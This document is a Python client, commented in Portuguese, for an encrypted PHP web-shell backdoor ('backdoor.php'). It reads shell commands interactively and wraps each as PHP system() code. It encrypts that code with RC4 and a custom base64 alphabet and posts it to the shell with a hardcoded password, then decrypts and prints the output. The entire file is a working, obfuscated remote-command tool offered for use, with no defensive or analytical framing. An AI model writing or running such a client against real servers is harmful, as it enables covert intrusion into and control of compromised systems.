import base64
import hashlib
import random
import requests


URL_SERVIDOR = "http://localhost:8000/backdoor.php"
SENHA_PLANA = "senhafoda"  


CANONICAL_ALPHABET = (
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
)
COMMITTEE_ALTERNATE = (
    "DkF_q1o9zP2tBvN8cRs3wXjV-H6aYI4gM5lUeZ0xL7CbdTmAhySrnJQWpfGKuEiO"
)


def rc4(data: bytes, key: str) -> bytes:
    """Implementação simétrica do RC4 (mesma lógica de applyRegionalEntropyHarmonization)"""
    key_bytes = key.encode("latin1")
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key_bytes[i % len(key_bytes)]) % 256
        S[i], S[j] = S[j], S[i]

    i = 0
    j = 0
    out = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        out.append(byte ^ k)
    return bytes(out)


def custom_base64_encode(data: bytes) -> str:
    """Equivalente ao normalizeSurpriseToWireCanonicalForm"""
    std_b64 = base64.b64encode(data).decode("latin1")
    trans = str.maketrans(CANONICAL_ALPHABET, COMMITTEE_ALTERNATE)
    return std_b64.translate(trans)


def custom_base64_decode(encoded_str: str) -> bytes:
    """Equivalente ao materializeInboundSurpriseFromCanonicalForm"""
    trans = str.maketrans(COMMITTEE_ALTERNATE, CANONICAL_ALPHABET)
    std_b64 = encoded_str.translate(trans)
    return base64.b64decode(std_b64)



while True:
    cmd = input("vm-shell> ")
    if cmd.lower() == "sair":
        print("Encerrando cliente...")
        break
    if not cmd.strip():
        continue

    php_code = f"echo system('{cmd}');"

    nonce = str(random.randint(100000, 999999))
    inbound_credential_token = f"{SENHA_PLANA}-{nonce}"

    nonce_digest = hashlib.md5(nonce.encode()).hexdigest()
    operational_entropy_binding = inbound_credential_token + nonce_digest + nonce

    encrypted_bytes = rc4(php_code.encode("latin1"), operational_entropy_binding)

    wire_form = custom_base64_encode(encrypted_bytes)

    headers = {"Authorized": inbound_credential_token}
    payload_body = f"p={wire_form}"

    try:
        resp = requests.post(
            URL_SERVIDOR, headers=headers, data=payload_body, timeout=5
        )

        if resp.status_code == 200 and resp.text.strip():
            try:
                resp_encoded = resp.text.strip()
                resp_encrypted = custom_base64_decode(resp_encoded)
                resp_decrypted = rc4(resp_encrypted, operational_entropy_binding)

                print(
                    f"\n[Saída do Servidor]:\n{resp_decrypted.decode('latin1')}"
                )
            except Exception as decode_err:
                print(f"\n[Aviso] Erro ao decodificar resposta: {decode_err}")
                print(f"Resposta bruta recebida: {resp.text}")
        else:
            print(
                f"\n[Status HTTP: {resp.status_code}] Servidor não retornou dados ou negou acesso."
            )
            if resp.text:
                print(f"Texto bruto: {resp.text}")

        print("-" * 60)

    except requests.exceptions.ConnectionError:
        print(
            "\n[Erro] Não foi possível conectar ao servidor. Verifique se o PHP está rodando na VM.\n"
        )
    except Exception as e:
        print(f"\n[Erro Inesperado]: {e}\n")
